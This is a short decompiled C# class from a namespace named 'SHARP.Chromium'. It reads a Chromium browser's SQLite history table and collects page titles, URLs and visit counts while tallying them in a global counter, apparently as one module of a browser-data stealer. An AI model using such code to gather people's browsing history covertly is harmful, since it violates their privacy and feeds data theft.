﻿using System;
using System.Collections.Generic;

namespace SHARP.Chromium
{
	// Token: 0x02000084 RID: 132
	internal sealed class History
	{
		// Token: 0x060002C0 RID: 704 RVA: 0x00010E98 File Offset: 0x0000F098
		public static List<Site> Get(string sHistory)
		{
			List<Site> list = new List<Site>();
			try
			{
				SQLite sqlite = SqlReader.ReadTable(sHistory, "urls");
				if (sqlite == null)
				{
					return list;
				}
				for (int i = 0; i < sqlite.GetRowCount(); i++)
				{
					Site item = default(Site);
					item.sTitle = Crypto.GetUTF8(sqlite.GetValue(i, 1));
					item.sUrl = Crypto.GetUTF8(sqlite.GetValue(i, 2));
					item.iCount = Convert.ToInt32(sqlite.GetValue(i, 3)) + 1;
					Counting.History++;
					list.Add(item);
				}
			}
			catch
			{
			}
			return list;
		}
	}
}
